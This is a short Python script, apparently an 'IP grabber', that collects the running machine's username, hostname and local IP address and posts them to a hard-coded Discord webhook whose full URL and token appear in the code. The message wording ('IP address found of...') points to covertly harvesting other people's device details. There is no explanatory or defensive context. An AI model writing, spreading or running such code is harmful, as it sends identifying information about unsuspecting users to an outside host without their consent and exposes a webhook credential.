import socket
import requests
import json
import os

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1342921966214189236/fUd-vblAAhWQcWiw0bUvYo5NWXic31kfcGHiLZ_ZTvKA48wEnkNjRDVir4g5cW8zw5pt"

# Function to get local IP address, hostname, and username
def get_device_info():
    username = os.getlogin()  # Get the current username
    hostname = socket.gethostname()  # Get the device hostname
    local_ip = socket.gethostbyname(hostname)  # Get the local IP address
    return username, hostname, local_ip

# Function to send data to Discord webhook
def send_to_discord(username, hostname, ip_address):
    message = f"IP address found of {username} ({hostname}):\n```\n{ip_address}\n```"
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers=headers)
    if response.status_code == 204:
        print("Data sent to Discord webhook successfully.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")

# Main execution
if __name__ == "__main__":
    username, hostname, ip_address = get_device_info()
    send_to_discord(username, hostname, ip_address)